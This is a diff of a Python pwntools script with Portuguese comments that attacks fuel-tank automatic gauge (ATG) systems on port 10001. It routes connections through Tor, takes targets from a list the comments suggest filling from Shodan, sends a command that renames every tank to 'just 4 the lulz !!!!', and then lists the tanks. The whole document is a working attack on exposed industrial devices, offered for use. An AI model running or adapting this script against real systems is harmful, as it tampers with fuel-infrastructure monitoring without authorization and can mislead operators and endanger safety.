@@ -1,38 +1,38 @@
-#	Made by: Pr1mus and R1se
-#
-#	Telegram: @ozym4ndias @Risezin
-
+"""
+	by @ozym4ndias @Risezin at telegram
+paper que inspirou script: https://telegra.ph/Hackeando-tanques-de-combust%C3%ADvelATG-02-03
+"""
 from pwn import *
 from time import sleep
 
-#	no IpsList coloque quantos ip's vc quiser, precisam estar claro entre 
-#	aspas e separados por virgulas.
-IpsList = [coloque os ips aqui]
+# add ipList at list(use shodan to search)
+ipList = ['127.0.0.1', '1.1.1.1']
 
-# Usando ip do Tor pra fazer as conexoes
+# usa proxy do tor durante as conexoes
 context.proxy = (socks.SOCKS5, 'localhost', 9050)
+# pega seu IP
 wg = wget('https://ipinfo.io/ip')
 
 if wg is None:
   exit()
 
 print "your ip: %s" % wg
-
 sleep(4)
 
-# Tenta se conectar em todos os ip's da lista na porta 10001(default do ATG)
-# se um dos ip's derem algum erro ele sera ignorado e o script vai pro prox ip.
-for L in IpsList:
+# tenta conectar no ip de ipList na porta 10001(porta default do ATG)
+for ip in ipList:
 	try:
-		r = remote(L, 10001)
-		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') # muda o nome de todos os tanques pra "just 4 the lulz"
-								# vc pode trocar essa frase por qualquer uma que quiser
+		r = remote(ip, 10001)
+		# comando para mudar o nome de todos os tanques para "just 4 the lulz !!!!"
+		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') 
 		r.send('\x01'+'I20100\r\n') # lista todos os tanques
-		r.recvuntil(' ', drop=True)	
 		
+		r.recvuntil(' ', drop=True)	
 		response = r.recv(4029)
 		print "\tresponse = %s" % response
-	
+		
 		r.close()
-	except Exception:
-		print "erro ao conecta no ip {}" .format(L)
+	except:
+		# caso nao consiga se conectar no ip vai para o proximo da lista
+		print "erro ao conectar ao ip %s:10001" % ip
+		pass
